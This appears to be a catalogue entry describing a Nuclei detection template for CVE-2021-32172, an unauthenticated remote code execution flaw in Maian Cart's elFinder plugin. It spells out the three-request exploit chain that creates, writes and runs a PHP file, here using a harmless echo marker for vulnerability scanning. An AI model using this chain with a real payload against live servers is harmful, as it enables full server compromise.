---
cve_id: CVE-2021-32172
template_path: nuclei-templates/http/cves/2021/CVE-2021-32172.yaml
affected_product: Maian Cart
severity: critical
authentication: none
external_callback: false
affected_versions: 3.0 to 3.8
preconditions: elFinder file manager plugin present
poc_classification: rce
---

## Vulnerability
Maian Cart 3.0 to 3.8 contains an unauthenticated remote code execution vulnerability via its bundled elFinder file manager plugin (CWE-862 Missing Authorization). An attacker can create arbitrary PHP files in the web root and execute them, achieving full server compromise.  
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8). Impact includes arbitrary code execution on the affected system.

## PoC / Detection
Classification: rce  
The template detects the flaw with a three-request chain that weaponizes the elFinder endpoint:  
1. `GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name={{randstr}}.php&target=l1_Lw` creates a blank PHP file.  
2. `POST /admin/index.php?p=ajax-ops&op=elfinder` with `cmd=put&target={{hash}}&content=<?php echo "{{randstr_1}}"; ?>` writes executable PHP payload (hash extracted via regex from prior response).  
3. `GET /product-downloads/{{randstr}}.php` executes the file; matcher confirms `{{randstr_1}}` appears in body with status 200.

## References
- https://dreyand.github.io/maian-cart-rce/
- https://github.com/DreyAnd/maian-cart-rce
- https://www.maianscriptworld.co.uk/critical-updates
- https://nvd.nist.gov/vuln/detail/CVE-2021-32172
- https://www.maianscriptworld.co.uk/
